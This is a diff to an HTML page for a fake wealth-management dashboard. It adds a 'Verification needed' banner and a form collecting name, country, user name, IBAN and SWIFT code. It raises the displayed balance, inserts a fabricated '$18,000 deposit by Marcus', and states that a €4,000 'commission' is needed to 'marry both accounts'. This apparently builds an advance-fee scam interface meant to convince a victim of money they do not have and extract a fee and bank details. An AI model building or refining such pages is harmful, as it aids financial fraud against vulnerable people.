@@ -220,6 +220,184 @@
 
     .action-btn:hover { opacity: 0.9; }
 
+    .notification {
+      background: rgba(201, 168, 76, 0.12);
+      border: 1px solid rgba(201, 168, 76, 0.35);
+      color: var(--gold);
+      padding: 1rem 1.25rem;
+      border-radius: 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 1rem;
+      margin-bottom: 1.75rem;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .notification strong {
+      color: var(--text-primary);
+      font-weight: 600;
+    }
+
+    .notification button {
+      background: transparent;
+      border: 1px solid rgba(255,255,255,0.12);
+      color: var(--text-primary);
+      border-radius: 999px;
+      width: 34px;
+      height: 34px;
+      cursor: pointer;
+      transition: background 0.2s, border-color 0.2s;
+    }
+
+    .notification button:hover {
+      background: rgba(255,255,255,0.08);
+      border-color: rgba(255,255,255,0.25);
+    }
+
+    .verification-form {
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 20px;
+      padding: 1.75rem;
+      margin-bottom: 1.75rem;
+      display: none;
+      gap: 1rem;
+    }
+
+    .verification-form.active {
+      display: grid;
+    }
+
+    .verification-form label {
+      display: block;
+      font-size: 13px;
+      color: var(--text-secondary);
+      margin-bottom: 0.35rem;
+    }
+
+    .verification-form input {
+      width: 100%;
+      padding: 0.9rem 1rem;
+      border-radius: 12px;
+      border: 1px solid rgba(255,255,255,0.12);
+      background: rgba(255,255,255,0.04);
+      color: var(--text-primary);
+      font-size: 14px;
+    }
+
+    .verification-form input::placeholder {
+      color: rgba(255,255,255,0.55);
+    }
+
+    .verification-form .form-footer {
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+
+    .commission-note {
+      font-size: 13px;
+      color: var(--text-secondary);
+      border-top: 1px solid rgba(255,255,255,0.08);
+      padding-top: 1rem;
+      margin-top: 1rem;
+    }
+
+    .verification-form .submit-btn {
+      align-self: flex-start;
+      background: var(--gold);
+      color: var(--dark);
+      border: none;
+      padding: 0.9rem 1.25rem;
+      border-radius: 12px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+
+    @media (max-width: 900px) {
+      body { display: block; }
+
+      aside {
+        position: relative;
+        width: 100%;
+        height: auto;
+        border-right: none;
+        border-bottom: 1px solid var(--border-dim);
+        padding: 1.75rem 1.5rem;
+      }
+
+      main {
+        margin: 0;
+        padding: 2rem 1.5rem 3rem;
+      }
+
+      header {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 1rem;
+      }
+
+      .action-btn {
+        width: 100%;
+        text-align: center;
+      }
+
+      .dashboard-grid {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 1.5rem;
+      }
+
+      .balance-card {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 1rem;
+      }
+
+      .balance-amount {
+        font-size: 48px;
+      }
+
+      .balance-card div[style="text-align: right"] {
+        width: 100%;
+        text-align: left !important;
+      }
+    }
+
+    @media (max-width: 600px) {
+      body { padding-bottom: 1rem; }
+
+      .brand {
+        justify-content: center;
+      }
+
+      .brand-name { font-size: 20px; }
+
+      nav a {
+        padding: 0.75rem 0.9rem;
+        font-size: 13px;
+      }
+
+      .dashboard-grid {
+        gap: 1rem;
+      }
+
+      .transaction-item {
+        grid-template-columns: 40px 1fr;
+        padding: 0.9rem;
+      }
+
+      .tx-amount {
+        margin-top: 0.5rem;
+      }
+
+      .transaction-item .tx-icon {
+        width: 36px;
+        height: 36px;
+      }
+    }
   </style>
 </head>
 <body>
@@ -250,12 +428,49 @@
       <button class="action-btn">+ Move Funds</button>
     </header>
 
+    <div class="notification" id="verification-notice">
+      <div>
+        <strong>Verification needed:</strong> Please complete your identity verification to unlock full account access.
+      </div>
+      <div style="display:flex; gap:0.75rem;">
+        <button class="action-btn" style="padding:0.7rem 1rem; font-size:13px;" onclick="toggleVerificationForm()">Verify Now</button>
+        <button aria-label="Dismiss notification" onclick="document.getElementById('verification-notice').style.display='none'">×</button>
+      </div>
+    </div>
+
+    <div class="verification-form" id="verification-form">
+      <div>
+        <label for="full-name">Full Name</label>
+        <input id="full-name" type="text" placeholder="Enter your full name" required>
+      </div>
+      <div>
+        <label for="country">Country</label>
+        <input id="country" type="text" placeholder="Enter your country" required>
+      </div>
+      <div>
+        <label for="username">User Name</label>
+        <input id="username" type="text" placeholder="Enter your user name" required>
+      </div>
+      <div>
+        <label for="iban">IBAN</label>
+        <input id="iban" type="text" placeholder="Enter your IBAN" required>
+      </div>
+      <div>
+        <label for="swift">SWIFT Code</label>
+        <input id="swift" type="text" placeholder="Enter your SWIFT code" required>
+      </div>
+      <div class="form-footer">
+        <button class="submit-btn" onclick="submitVerification(event)">Submit Verification</button>
+        <p class="commission-note">A commission of €4,000 is needed for marrying both accounts together.</p>
+      </div>
+    </div>
+
     <div class="dashboard-grid">
       <!-- Total Balance Card -->
       <div class="card balance-card">
         <div>
           <div class="balance-label">Total Liquid Assets</div>
-          <div class="balance-amount">$600,365<span>.00</span></div>
+          <div class="balance-amount">$618,365<span>.00</span></div>
         </div>
         <div style="text-align: right">
           <div class="balance-label" style="color: var(--text-secondary)">Portfolio Yield</div>
@@ -267,6 +482,14 @@
       <div class="card">
         <div class="section-title">Recent Activity <a href="history.html" style="color: var(--gold); text-decoration: none;">View All</a></div>
         <div class="transaction-list">
+          <div class="transaction-item">
+            <div class="tx-icon">⬆️</div>
+            <div class="tx-info">
+              <h4>Deposit Received</h4>
+              <p>Deposit by Marcus — May 27, 2026</p>
+            </div>
+            <div class="tx-amount pos">+$18,000.00</div>
+          </div>
           <div class="transaction-item">
             <div class="tx-icon">📈</div>
             <div class="tx-info">
@@ -304,6 +527,29 @@
     // Simple date display
     const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
     document.getElementById('date-display').textContent = new Date().toLocaleDateString(undefined, options);
+
+    function toggleVerificationForm() {
+      const form = document.getElementById('verification-form');
+      form.classList.toggle('active');
+    }
+
+    function submitVerification(event) {
+      event.preventDefault();
+      const fullName = document.getElementById('full-name').value.trim();
+      const country = document.getElementById('country').value.trim();
+      const username = document.getElementById('username').value.trim();
+      const iban = document.getElementById('iban').value.trim();
+      const swift = document.getElementById('swift').value.trim();
+
+      if (!fullName || !country || !username || !iban || !swift) {
+        alert('Please fill in all required fields before submitting.');
+        return;
+      }
+
+      alert('Verification submitted successfully. Thank you!');
+      document.getElementById('verification-notice').style.display = 'none';
+      document.getElementById('verification-form').classList.remove('active');
+    }
   </script>
 </body>
 </html>
